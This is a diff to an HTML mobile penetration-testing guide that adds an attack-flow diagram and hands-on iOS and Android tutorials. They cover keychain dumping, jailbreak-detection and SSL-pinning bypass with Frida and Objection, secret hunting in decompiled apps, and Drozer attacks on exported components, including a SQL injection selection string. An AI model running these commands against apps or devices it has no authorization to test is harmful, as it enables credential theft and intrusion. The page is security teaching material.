@@ -15,6 +15,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap"
         rel="stylesheet">
     <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="diagrams.css">
 </head>
 
 <body>
@@ -29,12 +30,14 @@
                 <li><a href="#home" class="nav-link">HOME</a></li>
                 <li><a href="#about" class="nav-link">ABOUT</a></li>
                 <li><a href="#methodology" class="nav-link">METHODOLOGY</a></li>
+                <li><a href="#attack-flow" class="nav-link">ATTACK FLOW</a></li>
                 <li><a href="#tools" class="nav-link">TOOLS</a></li>
                 <li><a href="#ios" class="nav-link">iOS</a></li>
                 <li><a href="#android" class="nav-link">ANDROID</a></li>
                 <li><a href="#vulns" class="nav-link">VULNS</a></li>
                 <li><a href="#advanced" class="nav-link">ADVANCED</a></li>
                 <li><a href="#frida" class="nav-link">FRIDA</a></li>
+                <li><a href="#practical" class="nav-link">PRACTICAL</a></li>
                 <li><a href="ip-scanner.html" class="nav-link">IP SCANNER</a></li>
             </ul>
             <div class="hamburger"><span></span><span></span><span></span></div>
@@ -225,6 +228,267 @@
                             <li>Risk prioritization matrix</li>
                             <li>Retest verification</li>
                         </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- NEW: Attack Flow Diagram Section -->
+    <section id="attack-flow" class="section">
+        <div class="container">
+            <div class="section-header"><span class="section-tag">// ATTACK_FLOW_DIAGRAM</span>
+                <h2 class="section-title">Mobile App <span class="accent">Attack Architecture</span></h2>
+            </div>
+
+            <!-- Mobile App Security Layers -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">📱 Mobile Application Security Layers</h3>
+                <div class="layer-diagram">
+                    <div class="layer app-layer">
+                        <h4>APPLICATION LAYER</h4>
+                        <p>UI Components • Business Logic • Third-party SDKs • WebViews • Local Storage</p>
+                    </div>
+                    <div class="layer runtime-layer">
+                        <h4>RUNTIME LAYER</h4>
+                        <p>Dalvik/ART (Android) • Objective-C/Swift Runtime (iOS) • JavaScript Engine</p>
+                    </div>
+                    <div class="layer os-layer">
+                        <h4>OPERATING SYSTEM LAYER</h4>
+                        <p>Android Framework • iOS Frameworks • Sandbox • IPC Mechanisms • Keychain/Keystore</p>
+                    </div>
+                    <div class="layer kernel-layer">
+                        <h4>KERNEL LAYER</h4>
+                        <p>Linux Kernel (Android) • XNU Kernel (iOS) • Secure Enclave • Hardware Security</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Attack Flow Visualization -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">⚔️ Penetration Testing Attack Flow</h3>
+                <div class="flow-diagram">
+                    <div class="flow-row">
+                        <div class="flow-box">
+                            <h4>📥 APP ACQUISITION</h4>
+                            <p>Download IPA/APK from store or device</p>
+                        </div>
+                        <span class="flow-arrow">→</span>
+                        <div class="flow-box">
+                            <h4>🔓 DECRYPTION</h4>
+                            <p>Decrypt binary (iOS FairPlay/Android)</p>
+                        </div>
+                        <span class="flow-arrow">→</span>
+                        <div class="flow-box">
+                            <h4>📦 UNPACKING</h4>
+                            <p>Extract resources & binaries</p>
+                        </div>
+                    </div>
+                    <div class="flow-row">
+                        <span class="flow-arrow down">↓</span>
+                    </div>
+                    <div class="flow-row">
+                        <div class="flow-box warning">
+                            <h4>🔍 STATIC ANALYSIS</h4>
+                            <p>Decompile • Secrets • Patterns</p>
+                        </div>
+                        <span class="flow-arrow">→</span>
+                        <div class="flow-box warning">
+                            <h4>⚡ DYNAMIC ANALYSIS</h4>
+                            <p>Runtime hooks • Traffic • Memory</p>
+                        </div>
+                        <span class="flow-arrow">→</span>
+                        <div class="flow-box critical">
+                            <h4>💥 EXPLOITATION</h4>
+                            <p>PoC Development • Impact Demo</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Detailed Attack Vectors -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">🎯 Detailed Attack Vector Methodology</h3>
+                <div class="attack-diagram">
+                    <div class="attack-vector" data-step="STEP 1">
+                        <h4>🔎 Reconnaissance & Surface Mapping</h4>
+                        <p class="description">
+                            Collect app metadata, identify API endpoints, map attack surface. Analyze
+                            AndroidManifest.xml or Info.plist for permissions, exported components,
+                            URL schemes, and security configurations.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">apktool</span>
+                            <span class="tool-tag">aapt</span>
+                            <span class="tool-tag">plistutil</span>
+                            <span class="tool-tag">MobSF</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="STEP 2">
+                        <h4>🔐 Binary & Code Analysis</h4>
+                        <p class="description">
+                            Decompile DEX to Java (JADX) or analyze Mach-O binaries (Hopper/IDA).
+                            Search for hardcoded secrets, API keys, encryption keys, and insecure
+                            coding patterns. Analyze native libraries (.so/.dylib).
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">JADX</span>
+                            <span class="tool-tag">IDA Pro</span>
+                            <span class="tool-tag">Ghidra</span>
+                            <span class="tool-tag">class-dump</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="STEP 3">
+                        <h4>🌐 Network Traffic Interception</h4>
+                        <p class="description">
+                            Configure proxy, install CA certificate, bypass SSL pinning using
+                            Frida/Objection. Analyze API requests, authentication tokens, and
+                            sensitive data in transit. Test for IDOR, injection vulnerabilities.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">Burp Suite</span>
+                            <span class="tool-tag">mitmproxy</span>
+                            <span class="tool-tag">Frida</span>
+                            <span class="tool-tag">Objection</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="STEP 4">
+                        <h4>💉 Runtime Manipulation</h4>
+                        <p class="description">
+                            Hook methods with Frida to bypass security checks, extract secrets,
+                            and manipulate app behavior. Dump Keychain/Keystore, bypass biometric
+                            authentication, and disable root/jailbreak detection.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">Frida</span>
+                            <span class="tool-tag">Objection</span>
+                            <span class="tool-tag">r2frida</span>
+                            <span class="tool-tag">Cycript</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="STEP 5">
+                        <h4>📂 Data Storage Analysis</h4>
+                        <p class="description">
+                            Examine local databases (SQLite), SharedPreferences/NSUserDefaults,
+                            cache files, and temporary storage. Check for sensitive data stored
+                            without encryption. Analyze backup files and logs.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">SQLite Browser</span>
+                            <span class="tool-tag">adb</span>
+                            <span class="tool-tag">ideviceinstaller</span>
+                            <span class="tool-tag">keychain-dumper</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="STEP 6">
+                        <h4>📝 Report & Remediation</h4>
+                        <p class="description">
+                            Document all findings with CVSS scores, create detailed PoC
+                            demonstrations, provide remediation recommendations, and
+                            prepare executive summary for stakeholders.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">CVSS Calculator</span>
+                            <span class="tool-tag">Markdown</span>
+                            <span class="tool-tag">Screenshots</span>
+                            <span class="tool-tag">Video PoC</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Testing Matrix -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">🔒 Security Testing Coverage Matrix</h3>
+                <div class="security-matrix">
+                    <div class="matrix-cell">
+                        <div class="icon">🔑</div>
+                        <h5>Authentication</h5>
+                        <p>Biometric bypass, token analysis, session hijacking</p>
+                    </div>
+                    <div class="matrix-cell">
+                        <div class="icon">🔐</div>
+                        <h5>Authorization</h5>
+                        <p>IDOR, privilege escalation, access control bypass</p>
+                    </div>
+                    <div class="matrix-cell">
+                        <div class="icon">💾</div>
+                        <h5>Data Storage</h5>
+                        <p>Keychain, databases, files, cache, logs</p>
+                    </div>
+                    <div class="matrix-cell">
+                        <div class="icon">🌐</div>
+                        <h5>Network</h5>
+                        <p>TLS, pinning, API security, WebSocket</p>
+                    </div>
+                    <div class="matrix-cell">
+                        <div class="icon">🧬</div>
+                        <h5>Cryptography</h5>
+                        <p>Key management, algorithms, implementation</p>
+                    </div>
+                    <div class="matrix-cell">
+                        <div class="icon">🛡️</div>
+                        <h5>Binary Protection</h5>
+                        <p>Obfuscation, anti-tampering, anti-debug</p>
+                    </div>
+                    <div class="matrix-cell">
+                        <div class="icon">📱</div>
+                        <h5>Platform</h5>
+                        <p>Root/JB detection, IPC, permissions</p>
+                    </div>
+                    <div class="matrix-cell">
+                        <div class="icon">🎭</div>
+                        <h5>Business Logic</h5>
+                        <p>Race conditions, payment bypass, abuse</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Vulnerability Impact Chart -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">📊 Common Vulnerability Impact Assessment</h3>
+                <div class="impact-chart">
+                    <div class="impact-bar">
+                        <span class="impact-label">Hardcoded Secrets</span>
+                        <div class="impact-meter">
+                            <div class="impact-fill critical" style="width: 95%;"></div>
+                        </div>
+                        <span class="impact-value">9.5</span>
+                    </div>
+                    <div class="impact-bar">
+                        <span class="impact-label">SQL Injection</span>
+                        <div class="impact-meter">
+                            <div class="impact-fill critical" style="width: 90%;"></div>
+                        </div>
+                        <span class="impact-value">9.0</span>
+                    </div>
+                    <div class="impact-bar">
+                        <span class="impact-label">Auth Bypass</span>
+                        <div class="impact-meter">
+                            <div class="impact-fill critical" style="width: 88%;"></div>
+                        </div>
+                        <span class="impact-value">8.8</span>
+                    </div>
+                    <div class="impact-bar">
+                        <span class="impact-label">Missing SSL Pinning</span>
+                        <div class="impact-meter">
+                            <div class="impact-fill high" style="width: 75%;"></div>
+                        </div>
+                        <span class="impact-value">7.5</span>
+                    </div>
+                    <div class="impact-bar">
+                        <span class="impact-label">Insecure Storage</span>
+                        <div class="impact-meter">
+                            <div class="impact-fill high" style="width: 70%;"></div>
+                        </div>
+                        <span class="impact-value">7.0</span>
+                    </div>
+                    <div class="impact-bar">
+                        <span class="impact-label">Debug Enabled</span>
+                        <div class="impact-meter">
+                            <div class="impact-fill medium" style="width: 55%;"></div>
+                        </div>
+                        <span class="impact-value">5.5</span>
                     </div>
                 </div>
             </div>
@@ -792,6 +1056,380 @@ Java.perform(<span class="keyword">function</span>() {
         </div>
     </section>
 
+    <!-- NEW: Practical Deep-Dive Section -->
+    <section id="practical" class="section">
+        <div class="container">
+            <div class="section-header"><span class="section-tag">// PRACTICAL_DEEP_DIVE</span>
+                <h2 class="section-title">Hands-On <span class="accent">Practical Tutorials</span></h2>
+            </div>
+
+            <!-- iOS Deep Dive -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">🍎 iOS Pentesting Deep-Dive: Complete Workflow</h3>
+
+                <div class="command-demo">
+                    <div class="demo-header">
+                        <span class="demo-title">Tutorial: Extracting Secrets from iOS App</span>
+                    </div>
+                    <div class="demo-body">
+                        <div class="step" data-num="1">
+                            <div class="step-title">Connect to Jailbroken Device</div>
+                            <div class="step-desc">First, establish SSH connection to your jailbroken iOS device using
+                                iproxy for USB tunneling. This avoids network issues and provides faster connection.
+                            </div>
+                            <code># Start USB port forwarding in background
+$ iproxy 2222 22 &
+
+# Connect via SSH (default password: alpine)
+$ ssh root@localhost -p 2222
+
+# Verify connection
+root@iPhone:~# uname -a
+Darwin iPhone 22.0.0 xnu-8792.41.9~2/RELEASE_ARM64_T8110</code>
+                        </div>
+
+                        <div class="step" data-num="2">
+                            <div class="step-title">Locate and Extract Target App</div>
+                            <div class="step-desc">Find the target app bundle on device and extract the decrypted IPA.
+                                Apps from App Store are encrypted with FairPlay DRM - we need to decrypt them first.
+                            </div>
+                            <code># List installed applications
+$ frida-ios-dump -l
+PID    Name               Identifier
+-----  -----------------  ---------------------------
+1234   Target Bank        com.target.banking
+5678   Another App        com.another.app
+
+# Dump decrypted IPA (automatically decrypts FairPlay)
+$ frida-ios-dump "Target Bank"
+[*] Dumping Target Bank...
+[*] Generating "Target Bank.ipa"</code>
+                        </div>
+
+                        <div class="step" data-num="3">
+                            <div class="step-title">Static Analysis - Binary Inspection</div>
+                            <div class="step-desc">Unzip the IPA and analyze the Mach-O binary. Extract class
+                                information, search for hardcoded strings, and identify interesting methods.</div>
+                            <code># Extract IPA contents
+$ unzip "Target Bank.ipa" -d extracted/
+$ cd extracted/Payload/TargetBank.app/
+
+# Dump Objective-C class headers
+$ class-dump -H TargetBank -o headers/
+$ ls headers/ | wc -l
+347 classes found
+
+# Search for sensitive strings
+$ strings TargetBank | grep -iE "api|key|secret|password|token"
+APIKey=sk_live_xxxxxxxxxxxxxxxxxxx
+firebase_token=AIzaSyxxxxxxxxxxxxxxxxxx
+base_url=https://api.targetbank.com/v2/
+
+# Analyze binary security features
+$ otool -hv TargetBank
+Mach header
+      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
+MH_MAGIC_64   ARM64        ALL  0x00     EXECUTE    38       4584   NOUNDEFS DYLDLINK TWOLEVEL PIE
+
+# Check for Position Independent Executable (PIE)
+$ otool -l TargetBank | grep -A2 LC_ENCRYPTION_INFO</code>
+                        </div>
+
+                        <div class="step" data-num="4">
+                            <div class="step-title">Keychain Data Extraction</div>
+                            <div class="step-desc">Extract sensitive data stored in iOS Keychain. Many apps store
+                                tokens, passwords, and API keys in Keychain thinking it's completely secure.</div>
+                            <code># On jailbroken device, run keychain-dumper
+root@iPhone:~# keychain-dumper -a
+
+Generic Password
+----------------
+Service: com.target.banking
+Account: user_credentials
+Data: {"username":"john@email.com","password":"SecurePass123!"}
+
+Generic Password
+----------------
+Service: com.target.banking  
+Account: api_token
+Data: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
+
+# Using Objection for Keychain dump
+$ objection -g "Target Bank" explore
+... ios keychain dump
+... ios keychain dump --json keychain.json</code>
+                        </div>
+
+                        <div class="step" data-num="5">
+                            <div class="step-title">Runtime Analysis with Frida</div>
+                            <div class="step-desc">Hook into running application to monitor function calls, bypass
+                                checks, and extract runtime secrets. This is where the real magic happens.</div>
+                            <code># Trace all methods containing "password"
+$ frida-trace -U -f com.target.banking -m "*[* *password*]"
+Instrumenting...
+-[LoginController validatePassword:]: Auto-generated handler
+-[KeychainManager getPassword]: Auto-generated handler
+Started tracing 2 functions. Press Ctrl+C to stop.
+
+# Bypass jailbreak detection using Objection
+$ objection -g "Target Bank" explore
+... ios jailbreak disable
+[+] Jailbreak detection disabled
+
+# Disable SSL pinning
+... ios sslpinning disable
+[+] SSL Pinning Disabled
+
+# Dump cookies and local storage
+... ios cookies get
+... ios nsuserdefaults get</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Android Deep Dive -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">🤖 Android Pentesting Deep-Dive: Complete Workflow</h3>
+
+                <div class="command-demo">
+                    <div class="demo-header">
+                        <span class="demo-title">Tutorial: Compromising Android App Security</span>
+                    </div>
+                    <div class="demo-body">
+                        <div class="step" data-num="1">
+                            <div class="step-title">Setup Testing Environment</div>
+                            <div class="step-desc">Configure your rooted Android device or emulator with necessary
+                                tools. Install Frida server matching your device architecture.</div>
+                            <code># Check connected devices
+$ adb devices
+List of devices attached
+emulator-5554	device
+
+# Determine device architecture
+$ adb shell getprop ro.product.cpu.abi
+arm64-v8a
+
+# Download matching Frida server
+$ wget https://github.com/frida/frida/releases/download/16.1.4/frida-server-16.1.4-android-arm64.xz
+$ unxz frida-server-16.1.4-android-arm64.xz
+
+# Push and start Frida server
+$ adb push frida-server-16.1.4-android-arm64 /data/local/tmp/frida-server
+$ adb shell "chmod 755 /data/local/tmp/frida-server"
+$ adb shell "/data/local/tmp/frida-server &"
+
+# Verify Frida is running
+$ frida-ps -U
+  PID  Name
+-----  -------------
+ 1234  com.android.phone
+ 5678  com.target.app</code>
+                        </div>
+
+                        <div class="step" data-num="2">
+                            <div class="step-title">APK Extraction and Decompilation</div>
+                            <div class="step-desc">Extract the APK from device and decompile it to analyze source code,
+                                manifest, and resources.</div>
+                            <code># Find package path on device
+$ adb shell pm path com.target.app
+package:/data/app/~~xyz123==/com.target.app-abc123==/base.apk
+
+# Pull APK from device
+$ adb pull /data/app/~~xyz123==/com.target.app-abc123==/base.apk target.apk
+
+# Decompile to Java source code
+$ jadx -d decompiled/ target.apk
+INFO  - output directory: decompiled
+INFO  - loading ...
+INFO  - processing ...
+INFO  - done
+
+# Decompile to smali (for modification)
+$ apktool d target.apk -o smali_output/
+I: Using Apktool 2.7.0
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Decoding AndroidManifest.xml...</code>
+                        </div>
+
+                        <div class="step" data-num="3">
+                            <div class="step-title">Manifest & Security Config Analysis</div>
+                            <div class="step-desc">Analyze AndroidManifest.xml for security misconfigurations, exported
+                                components, and dangerous permissions.</div>
+                            <code># Extract and analyze manifest
+$ aapt dump xmltree target.apk AndroidManifest.xml | head -100
+
+# Check for exported components (security risk!)
+$ grep -i "android:exported=\"true\"" decompiled/AndroidManifest.xml
+<activity android:name=".DeepLinkActivity" android:exported="true">
+<provider android:name=".UserContentProvider" android:exported="true">
+<receiver android:name=".PushReceiver" android:exported="true">
+
+# Check for dangerous flags
+$ grep -iE "debuggable|allowBackup|usesCleartextTraffic" decompiled/AndroidManifest.xml
+android:debuggable="true"      # CRITICAL VULNERABILITY!
+android:allowBackup="true"     # Data can be extracted via backup
+android:usesCleartextTraffic="true"  # HTTP allowed
+
+# Analyze network security config
+$ cat decompiled/res/xml/network_security_config.xml
+<network-security-config>
+    <base-config cleartextTrafficPermitted="true">
+        <trust-anchors>
+            <certificates src="system"/>
+            <certificates src="user"/>  # User certs trusted!
+        </trust-anchors>
+    </base-config>
+</network-security-config></code>
+                        </div>
+
+                        <div class="step" data-num="4">
+                            <div class="step-title">Hardcoded Secrets Discovery</div>
+                            <div class="step-desc">Search decompiled code for hardcoded API keys, tokens, passwords, and
+                                other sensitive information.</div>
+                            <code># Search for API keys and secrets
+$ grep -rn "api_key\|apikey\|API_KEY" decompiled/sources/
+com/target/app/Config.java:15:    public static final String API_KEY = "sk_live_51234567890abcdef";
+com/target/app/Firebase.java:8:    private String FIREBASE_KEY = "AIzaSyxxxxxxxxxxxxxxxxxx";
+
+# Find hardcoded URLs and endpoints
+$ grep -rn "https://\|http://" decompiled/sources/ | grep -v ".png\|.jpg"
+com/target/app/ApiClient.java:12:    BASE_URL = "https://api.target.com/v3/"
+com/target/app/ApiClient.java:13:    DEBUG_URL = "http://staging.target.com/"  # Staging endpoint exposed!
+
+# Search for cryptographic keys
+$ grep -rn "-----BEGIN\|AES\|DES\|RSA\|private" decompiled/sources/
+com/target/app/Crypto.java:20:    private static final String AES_KEY = "ThisIsASecretKey123456789012";
+com/target/app/Crypto.java:21:    private static final String IV = "1234567890123456";
+
+# Find Firebase/AWS configurations
+$ find decompiled/ -name "*.json" -exec grep -l "firebase\|aws" {} \;
+decompiled/res/raw/google-services.json</code>
+                        </div>
+
+                        <div class="step" data-num="5">
+                            <div class="step-title">Data Storage Analysis</div>
+                            <div class="step-desc">Extract and analyze locally stored data including SharedPreferences,
+                                SQLite databases, and files.</div>
+                            <code># Access app's private directory (requires root)
+$ adb shell
+# su
+# cd /data/data/com.target.app/
+
+# List all stored data
+# ls -la
+drwxrwx--x  2 u0_a123 shared_prefs
+drwxrwx--x  2 u0_a123 databases  
+drwxrwx--x  2 u0_a123 cache
+drwxrwx--x  2 u0_a123 files
+
+# Extract SharedPreferences (often contains tokens!)
+# cat shared_prefs/user_prefs.xml
+<?xml version='1.0' encoding='utf-8'?>
+<map>
+    <string name="auth_token">eyJhbGciOiJIUzI1NiIs...</string>
+    <string name="user_id">12345</string>
+    <string name="remember_password">true</string>
+</map>
+
+# Extract and analyze SQLite database
+$ adb pull /data/data/com.target.app/databases/app.db
+$ sqlite3 app.db
+sqlite> .tables
+users  transactions  settings  cached_data
+
+sqlite> SELECT * FROM users;
+1|john@email.com|$2a$10$hashedpassword|active|admin</code>
+                        </div>
+
+                        <div class="step" data-num="6">
+                            <div class="step-title">Component Exploitation with Drozer</div>
+                            <div class="step-desc">Use Drozer to identify and exploit vulnerable Android components like
+                                exported activities, content providers, and broadcast receivers.</div>
+                            <code># Start Drozer console
+$ drozer console connect
+
+# Get attack surface overview
+dz> run app.package.attacksurface com.target.app
+Attack Surface:
+  3 activities exported
+  1 broadcast receivers exported
+  2 content providers exported
+  0 services exported
+
+# Exploit exported activity
+dz> run app.activity.start --component com.target.app .AdminPanelActivity
+# Admin panel opens without authentication!
+
+# Query vulnerable content provider
+dz> run app.provider.query content://com.target.app.provider/users
+| _id | email           | password_hash        | role  |
+| 1   | admin@target.com| $2a$10$xxxxxxxxxxxx | admin |
+| 2   | user@target.com | $2a$10$xxxxxxxxxxxx | user  |
+
+# SQL Injection in content provider
+dz> run app.provider.query content://com.target.app.provider/users --selection "1=1) UNION SELECT sql FROM sqlite_master--"</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SSL Pinning Bypass Techniques -->
+            <div class="architecture-diagram">
+                <h3 class="diagram-title">🔓 SSL Pinning Bypass Techniques Comparison</h3>
+                <div class="attack-diagram">
+                    <div class="attack-vector" data-step="METHOD 1">
+                        <h4>Objection (Easiest)</h4>
+                        <p class="description">
+                            One-command SSL pinning bypass using Objection. Works for most common pinning
+                            implementations including OkHttp, TrustManager, and NSURLSession.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">objection -g app explore</span>
+                            <span class="tool-tag">android/ios sslpinning disable</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="METHOD 2">
+                        <h4>Frida Scripts</h4>
+                        <p class="description">
+                            Custom Frida scripts for specific implementations. Required when Objection
+                            fails or for custom pinning solutions. Can hook specific classes and methods.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">frida-universal-pinning-bypass</span>
+                            <span class="tool-tag">Custom hooks</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="METHOD 3">
+                        <h4>APK Patching</h4>
+                        <p class="description">
+                            Modify the APK to disable pinning checks. Decompile, edit network security
+                            config or smali code, repack, and resign. Permanent bypass.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">apktool</span>
+                            <span class="tool-tag">apksigner</span>
+                        </div>
+                    </div>
+                    <div class="attack-vector" data-step="METHOD 4">
+                        <h4>Magisk Modules</h4>
+                        <p class="description">
+                            System-level bypass using Magisk modules like TrustMeAlready or
+                            MagiskTrustUserCerts. Affects all apps without modification.
+                        </p>
+                        <div class="tools-used">
+                            <span class="tool-tag">LSPosed</span>
+                            <span class="tool-tag">TrustMeAlready</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
     <section id="checklist" class="section">
         <div class="container">
             <div class="section-header"><span class="section-tag">// SECURITY_CHECKLIST</span>
@@ -954,8 +1592,8 @@ Java.perform(<span class="keyword">function</span>() {
                 <p>&copy; 2025 M0BPWNR. All rights reserved. | Developed by <span class="accent">Abdulaziz
                         (xsayfex)</span></p>
                 <div class="social-links">
-                    <a href="https://github.com/xsayfex" target="_blank" class="social-link">GitHub</a>
-                    <a href="https://twitter.com/xsayfex" target="_blank" class="social-link">Twitter</a>
+                    <a href="https://github.com/Abo-Najwa" target="_blank" class="social-link">GitHub</a>
+                    <a href="https://x.com/xsayfex404" target="_blank" class="social-link">Twitter</a>
                 </div>
             </div>
         </div>
